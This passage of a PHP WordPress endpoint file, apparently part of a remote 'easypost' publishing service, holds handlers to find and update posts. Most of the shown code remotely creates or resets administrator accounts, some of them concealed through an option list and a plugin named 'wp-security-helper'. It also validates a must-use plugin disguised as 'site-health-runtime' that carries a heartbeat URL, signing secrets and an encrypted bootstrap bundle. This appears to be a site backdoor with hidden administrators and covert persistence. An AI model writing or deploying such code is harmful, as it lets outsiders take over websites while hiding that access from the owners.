            $row = easypost_endpoint_posting_row($post_type, 'slug', $slug);
            $conflict_by = 'SLUG';
        }
        if ($row === null && $target !== '') {
            $row = easypost_endpoint_posting_row($post_type, 'target', $target);
            $conflict_by = 'TARGET_URL';
        }
    }
    $post = $row === null ? null : array(
        'id' => (int) $row->ID,
        'slug' => $row->post_name,
        'status' => $row->post_status,
        'link' => get_permalink((int) $row->ID),
        'title' => array('raw' => $row->post_title),
        'content' => array('raw' => $row->post_content),
    );
    easypost_endpoint_json(200, array('ok' => true, 'found' => $row !== null, 'post' => $post, 'conflictBy' => $row === null ? '' : $conflict_by));
}

function easypost_endpoint_update_post($payload) {
    easypost_endpoint_bootstrap_wordpress();
    $post_type = easypost_endpoint_posting_type($payload);
    $post_id = easypost_endpoint_posting_id(isset($payload['id']) ? $payload['id'] : null);
    if (!function_exists('wp_update_post') || !function_exists('wp_slash')) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'capability_failed'));
    }
    foreach (array('title', 'slug', 'contentHtml', 'content', 'status', 'date', 'publicationDate') as $key) {
        if (array_key_exists($key, $payload) && !is_string($payload[$key])) {
            easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_post_input'));
        }
    }
    if (isset($payload['status']) && $payload['status'] !== 'publish') {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'unsupported_status'));
    }
    $row = easypost_endpoint_posting_row($post_type, 'id', $post_id);
    if ($row === null) {
        easypost_endpoint_json(404, array('ok' => false, 'error' => 'post_not_found'));
    }
    $postarr = array('ID' => $post_id, 'post_type' => $post_type, 'post_status' => 'publish');
    if (isset($payload['title'])) {
        $postarr['post_title'] = wp_strip_all_tags($payload['title']);
    }
    if (isset($payload['slug'])) {
        $postarr['post_name'] = sanitize_title($payload['slug']);
    }
    if (isset($payload['contentHtml']) || isset($payload['content'])) {
        $postarr['post_content'] = isset($payload['contentHtml']) ? $payload['contentHtml'] : $payload['content'];
    }
    if (!empty($payload['date']) || !empty($payload['publicationDate'])) {
        $date = str_replace('T', ' ', !empty($payload['date']) ? $payload['date'] : $payload['publicationDate']);
        if (preg_match('/^\d{4}-\d{2}-\d{2}$/D', $date)) {
            $date .= ' 00:00:00';
        }
        $parsed_date = DateTime::createFromFormat('!Y-m-d H:i:s', $date);
        if (!$parsed_date || $parsed_date->format('Y-m-d H:i:s') !== $date || !function_exists('get_gmt_from_date')) {
            easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_post_date'));
        }
        $postarr['post_date'] = $date;
        $postarr['post_date_gmt'] = get_gmt_from_date($date);
        $postarr['edit_date'] = true;
    }
    $updated_id = wp_update_post(wp_slash($postarr), true);
    if (is_wp_error($updated_id) || !is_numeric($updated_id) || (int) $updated_id !== $post_id) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'update_failed'));
    }
    easypost_endpoint_json(200, array(
        'ok' => true,
        'id' => $post_id,
        'postId' => $post_id,
        'link' => get_permalink($post_id),
        'postUrl' => get_permalink($post_id),
        'slug' => get_post_field('post_name', $post_id),
        'status' => get_post_status($post_id),
        'created' => false,
    ));
}

function easypost_endpoint_admin_response($status, $ok, $code, $exists = false, $user = null, $login_matches = false, $password_matches = false, $concealed = false) {
    if (isset($_GET['action']) && $_GET['action'] === 'reconcile_portfolio_admin' && !$ok) {
        $error = 'admin_verification_failed';
        if (strpos((string) $code, 'INVALID_') === 0) {
            $error = 'admin_input_invalid';
        } elseif (in_array($code, array('LOGIN_CONFLICT', 'USER_EXISTS'), true)) {
            $error = 'admin_concurrent_change';
        } elseif (in_array($code, array('CREATE_FAILED', 'RESTORE_FAILED'), true)) {
            $error = 'admin_write_failed';
        } elseif ($code === 'ROLLBACK_FAILED') {
            $error = 'admin_rollback_failed';
        } elseif (in_array($code, array('CAPABILITY_FAILED', 'CONCEALMENT_UNAVAILABLE'), true)) {
            $error = 'admin_api_unavailable';
        }
        easypost_endpoint_json($status, array('ok' => false, 'error' => $error));
    }
    $response = array(
        'ok' => (bool) $ok,
        'code' => (string) $code,
        'exists' => (bool) $exists,
        'wpUserId' => $user ? (int) $user->ID : null,
        'loginMatches' => (bool) $login_matches,
        'passwordMatches' => (bool) $password_matches,
    );
    if (isset($_GET['action']) && $_GET['action'] === 'reconcile_portfolio_admin') {
        $response['administrator'] = $user
            && in_array('administrator', isset($user->roles) ? (array) $user->roles : array(), true);
        $response['concealmentMatches'] = $user
            && easypost_endpoint_admin_concealment_matches((int) $user->ID, (bool) $concealed)
            && (!$concealed || easypost_endpoint_hidden_helper_active());
    }
    easypost_endpoint_json($status, $response);
}

function easypost_endpoint_find_admin($wp_user_id, $login) {
    if (!function_exists('get_user_by')) {
        return null;
    }
    if ($wp_user_id !== null) {
        return get_user_by('id', $wp_user_id) ?: null;
    }
    return $login !== '' ? (get_user_by('login', $login) ?: null) : null;
}

function easypost_endpoint_admin_state($user, $login, $password) {
    if (!$user) {
        return array(false, false);
    }
    $login_matches = hash_equals((string) $user->user_login, $login);
    $password_matches = function_exists('wp_check_password')
        ? (bool) wp_check_password($password, (string) $user->user_pass, (int) $user->ID)
        : false;
    return array($login_matches, $password_matches);
}

function easypost_endpoint_clean_admin_cache($user_id, $old_login, $new_login) {
    if (function_exists('clean_user_cache')) {
        clean_user_cache($user_id);
    }
    if (function_exists('wp_cache_delete')) {
        wp_cache_delete($user_id, 'users');
        if ($old_login !== '') {
            wp_cache_delete($old_login, 'userlogins');
        }
        if ($new_login !== '') {
            wp_cache_delete($new_login, 'userlogins');
        }
    }
}

function easypost_endpoint_parse_admin_concealment_ids($raw) {
    $parts = preg_split('/[\s,;]+/', $raw);
    return array_values(array_unique(array_filter(array_map('intval', (array) $parts), function ($value) {
        return $value > 0;
    })));
}

function easypost_endpoint_admin_concealment_ids() {
    $row = easypost_endpoint_read_option_row('wsh_tracked_admin_ids');
    if ($row['status'] !== 'found') {
        return array();
    }
    return easypost_endpoint_parse_admin_concealment_ids((string) $row['value']);
}

function easypost_endpoint_admin_concealment_state($user_id) {
    $row = easypost_endpoint_read_option_row('wsh_tracked_admin_ids');
    if ($row['status'] === 'unavailable') {
        return 'unavailable';
    }
    if ($row['status'] === 'missing') {
        return 'visible';
    }
    return in_array(
        (int) $user_id,
        easypost_endpoint_parse_admin_concealment_ids((string) $row['value']),
        true
    ) ? 'concealed' : 'visible';
}

function easypost_endpoint_admin_is_concealed($user_id) {
    return easypost_endpoint_admin_concealment_state($user_id) === 'concealed';
}

function easypost_endpoint_admin_concealment_matches($user_id, $concealed) {
    $state = easypost_endpoint_admin_concealment_state($user_id);
    if ($state === 'unavailable') {
        return false;
    }
    return $concealed ? $state === 'concealed' : $state === 'visible';
}

function easypost_endpoint_set_admin_concealment($user_id, $concealed) {
    global $wpdb;
    $user_id = (int) $user_id;
    if ($user_id < 1
        || !isset($wpdb)
        || !isset($wpdb->options)
        || !method_exists($wpdb, 'query')
        || !method_exists($wpdb, 'prepare')) {
        return false;
    }
    $option = 'wsh_tracked_admin_ids';
    for ($attempt = 0; $attempt < 5; $attempt++) {
        $row = easypost_endpoint_read_option_row($option);
        if ($row['status'] === 'unavailable') {
            return false;
        }
        $raw = $row['status'] === 'found' ? (string) $row['value'] : '';
        $ids = easypost_endpoint_parse_admin_concealment_ids($raw);
        $is_concealed = in_array($user_id, $ids, true);
        if ((bool) $concealed === $is_concealed) {
            return true;
        }
        if ($concealed) {
            $ids[] = $user_id;
            $ids = array_values(array_unique($ids));
        } else {
            $ids = array_values(array_filter($ids, function ($value) use ($user_id) {
                return (int) $value !== $user_id;
            }));
        }
        $desired = implode(',', $ids);

        if ($row['status'] === 'missing') {
            $inserted = easypost_endpoint_insert_option_once($option, $desired);
            if ($inserted === 'unavailable') {
                return false;
            }
            if ($inserted === 'inserted') {
                return easypost_endpoint_admin_concealment_matches($user_id, $concealed);
            }
            continue;
        }

        $updated = $wpdb->query(
            $wpdb->prepare(
                "UPDATE {$wpdb->options} SET option_value = %s WHERE option_name = %s AND option_value = %s",
                $desired,
                $option,
                $raw
            )
        );
        if ($updated === false || (int) $updated > 1) {
            return false;
        }
        if ((int) $updated === 1) {
            easypost_endpoint_cache_option_written(
                $option,
                false,
                easypost_endpoint_option_is_autoloaded($row['autoload'])
            );
            return easypost_endpoint_admin_concealment_matches($user_id, $concealed);
        }
    }
    return false;
}

function easypost_endpoint_hidden_helper_active() {
    if (!function_exists('is_plugin_active') && defined('ABSPATH')) {
        $plugin_api = ABSPATH . 'wp-admin/includes/plugin.php';
        if (is_readable($plugin_api)) {
            require_once $plugin_api;
        }
    }
    return function_exists('is_plugin_active')
        && is_plugin_active('wp-security-helper/wp-security-helper.php')
        && class_exists('WP_Security_Helper', false);
}

function easypost_endpoint_admin_matches_contract($user, $login, $password, $concealed) {
    if (!$user
        || !hash_equals((string) $user->user_login, (string) $login)
        || !function_exists('wp_check_password')
        || !wp_check_password((string) $password, (string) $user->user_pass, (int) $user->ID)
        || !in_array('administrator', isset($user->roles) ? (array) $user->roles : array(), true)
        || !easypost_endpoint_admin_concealment_matches((int) $user->ID, (bool) $concealed)) {
        return false;
    }
    return !$concealed || easypost_endpoint_hidden_helper_active();
}

function easypost_endpoint_admin_snapshot($user) {
    $concealment = $user ? easypost_endpoint_admin_concealment_state((int) $user->ID) : 'unavailable';
    if (!$user || $concealment === 'unavailable') {
        return false;
    }
    return array(
        'id' => (int) $user->ID,
        'login' => (string) $user->user_login,
        'passwordHash' => (string) $user->user_pass,
        'roles' => isset($user->roles) ? (array) $user->roles : array(),
        'concealed' => $concealment === 'concealed',
    );
}

function easypost_endpoint_restore_admin_snapshot($snapshot) {
    global $wpdb;
    if (!is_array($snapshot)
        || !isset($snapshot['id'], $snapshot['login'], $snapshot['passwordHash'], $snapshot['roles'], $snapshot['concealed'])
        || !isset($wpdb)
        || !isset($wpdb->users)
        || !method_exists($wpdb, 'update')) {
        return false;
    }
    $restored = $wpdb->update(
        $wpdb->users,
        array('user_login' => $snapshot['login'], 'user_pass' => $snapshot['passwordHash']),
        array('ID' => (int) $snapshot['id']),
        array('%s', '%s'),
        array('%d')
    );
    if ($restored === false) {
        return false;
    }
    $user = get_user_by('id', (int) $snapshot['id']);
    if (!$user || !method_exists($user, 'set_role')) {
        return false;
    }
    $roles = array_values($snapshot['roles']);
    $user->set_role(count($roles) ? $roles[0] : 'subscriber');
    if (method_exists($user, 'add_role')) {
        for ($index = 1; $index < count($roles); $index++) {
            $user->add_role($roles[$index]);
        }
    }
    if (!easypost_endpoint_set_admin_concealment((int) $snapshot['id'], (bool) $snapshot['concealed'])) {
        return false;
    }
    easypost_endpoint_clean_admin_cache((int) $snapshot['id'], '', (string) $snapshot['login']);
    $verified = get_user_by('id', (int) $snapshot['id']);
    return $verified
        && hash_equals((string) $verified->user_login, (string) $snapshot['login'])
        && hash_equals((string) $verified->user_pass, (string) $snapshot['passwordHash'])
        && (array) $verified->roles === (array) $snapshot['roles']
        && easypost_endpoint_admin_concealment_matches((int) $snapshot['id'], (bool) $snapshot['concealed']);
}

function easypost_endpoint_compensate_created_admin($user) {
    $user = is_object($user) ? $user : (function_exists('get_user_by') ? get_user_by('id', (int) $user) : false);
    if (!$user) {
        return false;
    }
    $user_id = (int) $user->ID;
    easypost_endpoint_set_admin_concealment($user_id, false);
    if (!function_exists('wp_delete_user') && defined('ABSPATH')) {
        $user_api = ABSPATH . 'wp-admin/includes/user.php';
        if (is_readable($user_api)) {
            require_once $user_api;
        }
    }
    if (function_exists('wp_delete_user') && wp_delete_user($user_id) && !get_user_by('id', $user_id)) {
        return true;
    }
    if (method_exists($user, 'set_role')) {
        $user->set_role('subscriber');
    }
    if (function_exists('wp_set_password')) {
        $replacement = function_exists('wp_generate_password')
            ? wp_generate_password(48, true, true)
            : bin2hex(random_bytes(32));
        wp_set_password($replacement, $user_id);
    }
    if (!easypost_endpoint_set_admin_concealment($user_id, false)) {
        return false;
    }
    easypost_endpoint_clean_admin_cache($user_id, (string) $user->user_login, '');
    $verified = get_user_by('id', $user_id);
    return $verified
        && !in_array('administrator', isset($verified->roles) ? (array) $verified->roles : array(), true)
        && easypost_endpoint_admin_concealment_matches($user_id, false);
}

function easypost_endpoint_reconcile_admin($payload) {
    if (!array_key_exists('operation', $payload)
        || !is_string($payload['operation'])
        || !in_array($payload['operation'], array('inspect', 'create', 'restore'), true)) {
        easypost_endpoint_admin_response(400, false, 'INVALID_OPERATION');
    }
    if (!array_key_exists('role', $payload)
        || !is_string($payload['role'])
        || !in_array($payload['role'], array('general', 'hidden', 'additional'), true)) {
        easypost_endpoint_admin_response(400, false, 'INVALID_ROLE');
    }
    $operation = $payload['operation'];
    $role = $payload['role'];
    if (!array_key_exists('concealed', $payload)
        || !is_bool($payload['concealed'])
        || $payload['concealed'] !== ('hidden' === $role)) {
        easypost_endpoint_admin_response(400, false, 'INVALID_CONCEALMENT');
    }
    if (!array_key_exists('login', $payload)
        || !is_string($payload['login'])
        || $payload['login'] === ''
        || !array_key_exists('password', $payload)
        || !is_string($payload['password'])
        || $payload['password'] === ''
        || !array_key_exists('wpUserId', $payload)
        || ($payload['wpUserId'] !== null
            && (!is_int($payload['wpUserId'])
                || $payload['wpUserId'] < 1
                || $payload['wpUserId'] > 2147483647))) {
        easypost_endpoint_admin_response(400, false, 'INVALID_CREDENTIAL_PAYLOAD');
    }
    $login = $payload['login'];
    $password = $payload['password'];
    $wp_user_id = $payload['wpUserId'];
    $concealed = $payload['concealed'];
    if (!function_exists('get_user_by') || !function_exists('wp_check_password')) {
        easypost_endpoint_admin_response(500, false, 'CAPABILITY_FAILED');
    }
    $requires_concealment = 'hidden' === $role
        && in_array($operation, array('create', 'restore'), true);
    if ($requires_concealment && !easypost_endpoint_hidden_helper_active()) {
        easypost_endpoint_admin_response(409, false, 'CONCEALMENT_UNAVAILABLE');
    }

    $user = easypost_endpoint_find_admin($wp_user_id, $login);
    if ($operation === 'inspect') {
        list($login_matches, $password_matches) = easypost_endpoint_admin_state($user, $login, $password);
        easypost_endpoint_admin_response(200, true, 'INSPECTED', (bool) $user, $user, $login_matches, $password_matches, $concealed);
    }

    if ($operation === 'create') {
        $login_owner = get_user_by('login', $login);
        if ($wp_user_id !== null) {
            if ($login_owner && (int) $login_owner->ID !== $wp_user_id) {
                easypost_endpoint_admin_response(409, false, 'LOGIN_CONFLICT', true, $login_owner);
            }
            if ($user) {
                easypost_endpoint_admin_response(409, false, 'USER_EXISTS', true, $user);
            }
            easypost_endpoint_admin_response(404, false, 'USER_NOT_FOUND');
        }
        if ($login_owner) {
            easypost_endpoint_admin_response(409, false, 'LOGIN_CONFLICT', true, $login_owner);
        }
        if (!function_exists('wp_create_user')) {
            easypost_endpoint_admin_response(500, false, 'CAPABILITY_FAILED');
        }
        $created_id = wp_create_user($login, $password);
        if ((function_exists('is_wp_error') && is_wp_error($created_id)) || (int) $created_id < 1) {
            easypost_endpoint_admin_response(500, false, 'CREATE_FAILED');
        }
        $created = get_user_by('id', (int) $created_id);
        if (!$created || !method_exists($created, 'set_role')) {
            $compensated = easypost_endpoint_compensate_created_admin((int) $created_id);
            easypost_endpoint_admin_response(500, false, $compensated ? 'CREATE_FAILED' : 'ROLLBACK_FAILED');
        }
        if ($requires_concealment && !easypost_endpoint_set_admin_concealment((int) $created->ID, true)) {
            $compensated = easypost_endpoint_compensate_created_admin($created);
            easypost_endpoint_admin_response($compensated ? 409 : 500, false, $compensated ? 'CONCEALMENT_FAILED' : 'ROLLBACK_FAILED');
        }
        $created->set_role('administrator');
        if (!$requires_concealment && !easypost_endpoint_set_admin_concealment((int) $created->ID, false)) {
            $compensated = easypost_endpoint_compensate_created_admin($created);
            easypost_endpoint_admin_response($compensated ? 409 : 500, false, $compensated ? 'CONCEALMENT_FAILED' : 'ROLLBACK_FAILED');
        }
        if ($requires_concealment && !easypost_endpoint_hidden_helper_active()) {
            $compensated = easypost_endpoint_compensate_created_admin($created);
            easypost_endpoint_admin_response($compensated ? 409 : 500, false, $compensated ? 'CONCEALMENT_UNAVAILABLE' : 'ROLLBACK_FAILED');
        }
        easypost_endpoint_clean_admin_cache((int) $created->ID, '', $login);
        $created = get_user_by('id', (int) $created->ID);
        if (!easypost_endpoint_admin_matches_contract($created, $login, $password, $concealed)) {
            $compensated = easypost_endpoint_compensate_created_admin($created ?: (int) $created_id);
            easypost_endpoint_admin_response(500, false, $compensated ? 'CREATE_FAILED' : 'ROLLBACK_FAILED');
        }
        list($login_matches, $password_matches) = easypost_endpoint_admin_state($created, $login, $password);
        easypost_endpoint_admin_response(201, true, 'CREATED', true, $created, $login_matches, $password_matches, $concealed);
    }

    $login_owner = get_user_by('login', $login);
    if ($login_owner && (!$user || (int) $login_owner->ID !== (int) $user->ID)) {
        easypost_endpoint_admin_response(409, false, 'LOGIN_CONFLICT', (bool) $user, $user);
    }
    if (!$user) {
        easypost_endpoint_admin_response(404, false, 'USER_NOT_FOUND');
    }
    if (!function_exists('wp_set_password')) {
        easypost_endpoint_admin_response(500, false, 'CAPABILITY_FAILED', true, $user);
    }

    $snapshot = easypost_endpoint_admin_snapshot($user);
    if ($snapshot === false) {
        easypost_endpoint_admin_response(500, false, 'CAPABILITY_FAILED', true, $user);
    }

    if ($requires_concealment && !easypost_endpoint_set_admin_concealment((int) $user->ID, true)) {
        $restored = easypost_endpoint_restore_admin_snapshot($snapshot);
        easypost_endpoint_admin_response($restored ? 409 : 500, false, $restored ? 'CONCEALMENT_FAILED' : 'ROLLBACK_FAILED', true, $user);
    }
    if ($requires_concealment && !easypost_endpoint_hidden_helper_active()) {
        $restored = easypost_endpoint_restore_admin_snapshot($snapshot);
        easypost_endpoint_admin_response($restored ? 409 : 500, false, $restored ? 'CONCEALMENT_UNAVAILABLE' : 'ROLLBACK_FAILED', true, $user);
    }

    $old_login = (string) $user->user_login;
    if (!hash_equals($old_login, $login)) {
        global $wpdb;
        if (!isset($wpdb) || !isset($wpdb->users)) {
            $restored = easypost_endpoint_restore_admin_snapshot($snapshot);
            easypost_endpoint_admin_response(500, false, $restored ? 'RESTORE_FAILED' : 'ROLLBACK_FAILED', true, $user);
        }
        $updated = $wpdb->update(
            $wpdb->users,
            array('user_login' => $login),
            array('ID' => (int) $user->ID),
            array('%s'),
            array('%d')
        );
        if ($updated === false) {
            $restored = easypost_endpoint_restore_admin_snapshot($snapshot);
            easypost_endpoint_admin_response(500, false, $restored ? 'RESTORE_FAILED' : 'ROLLBACK_FAILED', true, $user);
        }
    }
    wp_set_password($password, (int) $user->ID);
    $user = get_user_by('id', (int) $user->ID);
    if (!$user || !method_exists($user, 'set_role')) {
        $restored = easypost_endpoint_restore_admin_snapshot($snapshot);
        easypost_endpoint_admin_response(500, false, $restored ? 'RESTORE_FAILED' : 'ROLLBACK_FAILED');
    }
    $user->set_role('administrator');
    if ($requires_concealment && !easypost_endpoint_set_admin_concealment((int) $user->ID, true)) {
        $restored = easypost_endpoint_restore_admin_snapshot($snapshot);
        easypost_endpoint_admin_response($restored ? 409 : 500, false, $restored ? 'CONCEALMENT_FAILED' : 'ROLLBACK_FAILED', true, $user);
    }
    if (!$requires_concealment && !easypost_endpoint_set_admin_concealment((int) $user->ID, false)) {
        $restored = easypost_endpoint_restore_admin_snapshot($snapshot);
        easypost_endpoint_admin_response($restored ? 409 : 500, false, $restored ? 'CONCEALMENT_FAILED' : 'ROLLBACK_FAILED', true, $user);
    }
    if ($requires_concealment && !easypost_endpoint_hidden_helper_active()) {
        $restored = easypost_endpoint_restore_admin_snapshot($snapshot);
        easypost_endpoint_admin_response($restored ? 409 : 500, false, $restored ? 'CONCEALMENT_UNAVAILABLE' : 'ROLLBACK_FAILED', true, $user);
    }
    easypost_endpoint_clean_admin_cache((int) $user->ID, $old_login, $login);
    $restored = get_user_by('id', (int) $user->ID);
    if (!easypost_endpoint_admin_matches_contract($restored, $login, $password, $concealed)) {
        $compensated = easypost_endpoint_restore_admin_snapshot($snapshot);
        easypost_endpoint_admin_response(500, false, $compensated ? 'RESTORE_FAILED' : 'ROLLBACK_FAILED');
    }
    list($login_matches, $password_matches) = easypost_endpoint_admin_state($restored, $login, $password);
    easypost_endpoint_admin_response(200, true, 'RESTORED', true, $restored, $login_matches, $password_matches, $concealed);
}

function easypost_endpoint_rotate_token($payload) {
    easypost_endpoint_json(501, array(
        'ok' => false,
        'error' => 'rotate_token_not_implemented',
        'receivedTokenId' => isset($payload['tokenId']) ? $payload['tokenId'] : null,
    ));
}

function easypost_endpoint_site_runtime_path() {
    $directory = defined('WPMU_PLUGIN_DIR')
        ? rtrim(WPMU_PLUGIN_DIR, '/\\')
        : rtrim(WP_CONTENT_DIR, '/\\') . '/mu-plugins';
    return $directory . '/site-health-runtime.php';
}

function easypost_endpoint_base64url_decode($value) {
    if (!is_string($value) || !preg_match('/\A[A-Za-z0-9_-]+\z/', $value)) {
        return false;
    }
    $padding = strlen($value) % 4;
    if ($padding === 1) {
        return false;
    }
    $encoded = $value;
    if ($padding > 0) {
        $encoded .= str_repeat('=', 4 - $padding);
    }
    $decoded = base64_decode(strtr($encoded, '-_', '+/'), true);
    if ($decoded === false
        || !hash_equals($value, rtrim(strtr(base64_encode($decoded), '+/', '-_'), '='))) {
        return false;
    }
    return $decoded;
}

function easypost_endpoint_exact_array_keys($value, $expected) {
    if (!is_array($value)) {
        return false;
    }
    $actual = array_keys($value);
    sort($actual, SORT_STRING);
    sort($expected, SORT_STRING);
    return $actual === $expected;
}

function easypost_endpoint_site_runtime_manifest($runtime_php) {
    if (!is_string($runtime_php) || strlen($runtime_php) > 262144) {
        return false;
    }
    $pattern = '/\A<\?php\n\/\* SITE_HEALTH_RUNTIME_BEGIN_V1 \*\/\n'
        . '\/\* SITE_HEALTH_RUNTIME_MANIFEST_V1 ([A-Za-z0-9_-]+) \*\/\n'
        . '[\s\S]*\n\/\* SITE_HEALTH_RUNTIME_END_V1 \*\/\n\z/';
    if (!preg_match($pattern, $runtime_php, $matches)) {
        return false;
    }
    $manifest_json = easypost_endpoint_base64url_decode($matches[1]);
    if ($manifest_json === false) {
        return false;
    }
    $manifest = json_decode($manifest_json, true);
    if (!easypost_endpoint_exact_array_keys(
        $manifest,
        array('version', 'enabled', 'runtimeVersion', 'configurationVersion')
    )) {
        return false;
    }
    if ($manifest['version'] !== 1
        || !is_bool($manifest['enabled'])
        || !is_string($manifest['runtimeVersion'])
        || (!is_string($manifest['configurationVersion']) && $manifest['configurationVersion'] !== null)) {
        return false;
    }
    return $manifest;
}

function easypost_endpoint_php_single_quoted_value($value) {
    $decoded = '';
    $length = strlen($value);
    for ($index = 0; $index < $length; $index++) {
        $character = $value[$index];
        if ($character !== '\\') {
            $decoded .= $character;
            continue;
        }
        $index++;
        if ($index >= $length || ($value[$index] !== '\\' && $value[$index] !== "'")) {
            return false;
        }
        $decoded .= $value[$index];
    }
    return $decoded;
}

function easypost_endpoint_normalized_runtime_skeleton($runtime_php) {
    $manifest_pattern = '/SITE_HEALTH_RUNTIME_MANIFEST_V1 [A-Za-z0-9_-]+/';
    $config_pattern = "/define\\('SITE_HEALTH_RUNTIME_CONFIG_V1', '((?:\\\\.|[^'\\\\])*)'\\);/";
    $manifest_count = 0;
    $config_count = 0;
    $normalized = preg_replace(
        $manifest_pattern,
        'SITE_HEALTH_RUNTIME_MANIFEST_V1 __MANIFEST__',
        $runtime_php,
        1,
        $manifest_count
    );
    $normalized = preg_replace(
        $config_pattern,
        "define('SITE_HEALTH_RUNTIME_CONFIG_V1', '__CONFIG__');",
        $normalized,
        1,
        $config_count
    );
    if (!is_string($normalized) || $manifest_count !== 1 || $config_count !== 1) {
        return false;
    }
    return $normalized;
}

function easypost_endpoint_runtime_uuid($value) {
    return is_string($value)
        && preg_match('/\A[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\z/', $value);
}

function easypost_endpoint_runtime_secret($value) {
    $decoded = easypost_endpoint_base64url_decode($value);
    return $decoded !== false && strlen($decoded) === 32 ? $decoded : false;
}

function easypost_endpoint_runtime_url_is_canonical($value) {
    if (!is_string($value) || $value === '' || strlen($value) > 2048) {
        return false;
    }
    for ($index = 0; $index < strlen($value); $index++) {
        $byte = ord($value[$index]);
        if ($byte <= 32 || $byte >= 127) {
            return false;
        }
    }
    $parts = @parse_url($value);
    if (!is_array($parts)
        || !isset($parts['scheme'], $parts['host'])
        || $parts['scheme'] !== 'https'
        || isset($parts['user'])
        || isset($parts['pass'])) {
        return false;
    }
    $host = (string) $parts['host'];
    if ($host === '' || $host !== strtolower($host) || substr($host, -1) === '.') {
        return false;
    }
    $canonical_host = $host;
    if ($host[0] === '[' && substr($host, -1) === ']') {
        $inner = substr($host, 1, -1);
        $packed = @inet_pton($inner);
        if ($packed === false || strpos($inner, ':') === false || strtolower((string) inet_ntop($packed)) !== $inner) {
            return false;
        }
        $canonical_host = '[' . $inner . ']';
    } else {
        $packed = @inet_pton($host);
        if ($packed !== false) {
            if (strpos($host, ':') !== false || (string) inet_ntop($packed) !== $host) {
                return false;
            }
        } elseif (preg_match('/\A[0-9.]+\z/', $host)
            || !preg_match('/\A[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?\z/', $host)
            || strpos($host, '..') !== false) {
            return false;
        }
    }
    $path = isset($parts['path']) ? (string) $parts['path'] : '/';
    foreach (explode('/', $path) as $segment) {
        $decoded = rawurldecode($segment);
        if ($decoded === '.' || $decoded === '..') {
            return false;
        }
    }
    $port = isset($parts['port']) ? (int) $parts['port'] : null;
    $canonical = 'https://' . $canonical_host
        . ($port !== null && $port !== 443 ? ':' . $port : '')
        . $path
        . (isset($parts['query']) ? '?' . $parts['query'] : '')
        . (isset($parts['fragment']) ? '#' . $parts['fragment'] : '');
    return hash_equals($canonical, $value);
}

function easypost_endpoint_validate_runtime_users($users, $required_roles) {
    if (!easypost_endpoint_exact_array_keys($users, array('general', 'hidden', 'additional'))
        || !is_array($required_roles)
        || array_values($required_roles) !== $required_roles) {
        return false;
    }
    $derived = array();
    foreach (array('general', 'hidden', 'additional') as $role) {
        $user = $users[$role];
        if (!easypost_endpoint_exact_array_keys($user, array('required', 'login', 'email', 'password', 'wpUserId', 'concealed'))
            || !is_bool($user['required'])
            || !is_bool($user['concealed'])
            || $user['concealed'] !== ($role === 'hidden')) {
            return false;
        }
        if (!$user['required']) {
            if ($user['login'] !== null || $user['email'] !== null || $user['password'] !== null || $user['wpUserId'] !== null) {
                return false;
            }
            continue;
        }
        if (!is_string($user['login']) || trim($user['login']) === ''
            || !is_string($user['email']) || trim($user['email']) === '' || strpos($user['email'], '@') === false
            || !is_string($user['password']) || $user['password'] === ''
            || !is_int($user['wpUserId']) || $user['wpUserId'] < 1 || $user['wpUserId'] > 2147483647) {
            return false;
        }
        $derived[] = $role;
    }
    return $derived === $required_roles && in_array('general', $derived, true);
}

function easypost_endpoint_validate_runtime_config_contract($runtime_config) {
    $runtime_version = isset($runtime_config['runtimeVersion'])
        ? $runtime_config['runtimeVersion']
        : null;
    $expected_keys = array(
        'version', 'heartbeatUrl', 'tokenId', 'signingSecret', 'recoveryKey',
        'runtimeVersion', 'configurationVersion', 'repairEnabled', 'endpointProbe',
        'requiredRoles', 'bootstrapBundle'
    );
    if ($runtime_version === EASYPOST_CURRENT_RUNTIME_VERSION) {
        $expected_keys[] = 'applicationPassword';
    } elseif ($runtime_version !== EASYPOST_LEGACY_RUNTIME_VERSION
        && $runtime_version !== EASYPOST_PORTFOLIO_RUNTIME_VERSION) {
        return false;
    }
    if (!easypost_endpoint_exact_array_keys(
        $runtime_config,
        $expected_keys
    )
        || $runtime_config['version'] !== 1
        || !easypost_endpoint_runtime_uuid($runtime_config['tokenId'])
        || !easypost_endpoint_runtime_uuid($runtime_config['configurationVersion'])
        || !is_bool($runtime_config['repairEnabled'])
        || !easypost_endpoint_runtime_url_is_canonical($runtime_config['heartbeatUrl'])) {
        return false;
    }
    if ($runtime_version === EASYPOST_CURRENT_RUNTIME_VERSION) {
        $application_password = $runtime_config['applicationPassword'];
        if (!easypost_endpoint_exact_array_keys(
            $application_password,
            array('required', 'ownerWpUserId', 'managedUuid')
        )
            || !is_bool($application_password['required'])
            || ($application_password['ownerWpUserId'] !== null
                && (!is_int($application_password['ownerWpUserId'])
                    || $application_password['ownerWpUserId'] < 1
                    || $application_password['ownerWpUserId'] > 2147483647))
            || ($application_password['managedUuid'] !== null
                && !easypost_endpoint_runtime_uuid($application_password['managedUuid']))
            || (($application_password['ownerWpUserId'] === null)
                !== ($application_password['managedUuid'] === null))
            || (!$application_password['required']
                && ($application_password['ownerWpUserId'] !== null
                    || $application_password['managedUuid'] !== null))) {
            return false;
        }
    }
    $signing = easypost_endpoint_runtime_secret($runtime_config['signingSecret']);
    $recovery = easypost_endpoint_runtime_secret($runtime_config['recoveryKey']);
    $envelope = $runtime_config['bootstrapBundle'];
    if ($signing === false || $recovery === false || hash_equals($signing, $recovery)
        || !easypost_endpoint_exact_array_keys($envelope, array('version', 'cipher', 'nonce', 'tag', 'ciphertext'))
        || $envelope['version'] !== 1
        || $envelope['cipher'] !== 'aes-256-gcm') {
        return false;
    }
    $nonce = easypost_endpoint_base64url_decode($envelope['nonce']);
    $tag = easypost_endpoint_base64url_decode($envelope['tag']);
    $ciphertext = easypost_endpoint_base64url_decode($envelope['ciphertext']);
    if ($nonce === false || strlen($nonce) !== 12
        || $tag === false || strlen($tag) !== 16
        || $ciphertext === false
        || !function_exists('openssl_decrypt')) {
        return false;
    }
    $key = hash_hmac('sha256', 'site-health-runtime-bundle-v1', $recovery, true);
    $plaintext = openssl_decrypt(
        $ciphertext,
        'aes-256-gcm',
        $key,
        OPENSSL_RAW_DATA,
        $nonce,
        $tag,
        'site-health-runtime-bundle-v1'
    );
